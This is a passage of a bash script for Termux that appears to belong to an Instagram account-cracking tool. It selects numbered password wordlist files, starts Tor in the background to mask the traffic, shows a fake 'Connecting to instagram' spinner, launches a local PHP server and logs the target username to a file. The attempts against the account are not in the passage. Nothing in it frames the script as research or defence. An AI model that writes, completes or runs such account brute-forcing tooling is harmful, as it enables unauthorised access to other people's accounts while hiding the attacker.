elif [ $4 = 12 ]; then
value="/data/data/com.termux/files/usr/cookies/password-12.txt"
elif [ $4 = 13 ]; then
value="/data/data/com.termux/files/usr/cookies/password-13.txt"
elif [ $4 = 14 ]; then
value="/data/data/com.termux/files/usr/cookies/password-14.txt"
elif [ $4 = 15 ]; then
value="/data/data/com.termux/files/usr/cookies/password-15.txt"
else
clear
echo " choose password option"
exit
fi
tor > /dev/null 2>&1 &
clear
spinner=("1""2""3""4""5")
copy () {
        echo -n " Connecting to instagram"
        spin&
        pid=$!
        for i in `seq 1 5`
        do
        sleep 1
        done
        kill $pid
        echo ""
}
spin () {
        while [ 1 ]
        do
        echo -ne "."
        sleep 0.2
        done
}
copy
banners
cd /data/data/com.termux/files/usr/cookies
php -S 127.0.0.1:4444 > /dev/null 2>&1 &
echo "  User : $2 " >> /data/data/com.termux/files/usr/cookies/cookie.txt
